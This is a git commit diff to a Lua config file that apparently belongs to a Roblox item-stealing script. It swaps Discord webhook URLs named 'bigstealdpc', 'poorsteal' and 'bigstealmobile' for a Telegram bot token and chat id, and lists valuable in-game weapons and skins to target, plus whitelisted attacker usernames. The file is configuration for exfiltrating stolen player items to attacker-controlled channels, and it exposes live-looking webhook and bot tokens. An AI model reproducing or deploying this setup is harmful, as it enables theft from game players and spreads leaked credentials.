43b495c45d338386764e0315646e674c02db207b
LenivayZopaKota <lenivayzopa@bk.ru>
2025-08-20 20:32:52 +0800

    Update Config.lua

--- Config.lua
+++ Config.lua
@@ -1,11 +1,13 @@
-aprplayersLOX = {
+aprplayers = {
     "lenivayzopakota16",
     "lenivayzopakota62",
     "lenivayzopakota4",
 }
-richgodlies = {"Bat","Candy","Darksword","Darkshot", "Traveler's Gun", "Evergreen","Evergun","Bauble","Rainbow Gun", "Sunrise", "Sunset", "Rainbow","Constellation","Sakura","Blossom","Turkey","Vampire's Gun"}
-richgodliespc = {"TreeKnife2023", "Turkey2023", "TreeGun2023","TravelerGun","Sakura_K", "Blossom_G", "ZombieBat", "Constellation", "Candy", "VampireGun", "SunsetKnife", "SunsetGun","Darksword","Darkshot","Rainbow_G","Rainbow_K","Bauble"}
-skinNames = {"Corrupt","Vampire's Axe","Gingerscope","Traveler's Axe","Celestial","Icepiercer","Harvester","Bat","Candy","Darksword","Darkshot", "Traveler's Gun", "Evergreen","Evergun","Bauble","Rainbow Gun", "Sunrise", "Sunset", "Rainbow","Constellation","Sakura","Blossom","Turkey","Vampire's Gun"}
-bigstealdpc = "https://discord.com/api/webhooks/1404444962849820822/TzqtlSPagYvpAdy7qK8CKF76-mAEgUkti6j7PA0SHx5B6DWfTMWpCWlj4DXD1pdv526j"
-poorsteal = "https://discord.com/api/webhooks/1404445019200421928/EWqO7M5SykJPr7fa4x-G-vgLEUGB48fETyEQ2Y7YtmvCScQsNDh802RCkjMl7TYR7gk6"
-bigstealmobile = "https://discord.com/api/webhooks/1404444998451335292/254CpNMptZ4OAkKBhJhwTz2aLvv4hYPsiDLEV5Rk9G2C7pEh1dXB-0yv9GepTa2-qwN4"
+chatId = -1003099751350
+botToken = "7550570466:AAFu20M2RFY60MzB6ODBZDy3oXgn7MLxzho"
+threadmobile = 4
+threadpc = 2
+threaduniversal = 6
+richgodliesList = {"Bat","Candy","Darksword","Darkshot", "Traveler's Gun", "Evergreen","Evergun","Bauble","Rainbow Gun", "Sunrise", "Sunset", "Rainbow","Constellation","Sakura","Blossom","Turkey","Vampire's Gun"}
+richgodliesListpc = {"TreeKnife2023", "Turkey2023", "TreeGun2023","TravelerGun","Sakura_K", "Blossom_G", "ZombieBat", "Constellation", "Candy", "VampireGun", "SunsetKnife", "SunsetGun","Darksword","Darkshot","Rainbow_G","Rainbow_K","Bauble"}
+skinNamesTG = {"Corrupt","Vampire's Axe","Gingerscope","Traveler's Axe","Celestial","Icepiercer","Harvester","Bat","Candy","Darksword","Darkshot", "Traveler's Gun", "Evergreen","Evergun","Bauble","Rainbow Gun", "Sunrise", "Sunset", "Rainbow","Constellation","Sakura","Blossom","Turkey","Vampire's Gun"}
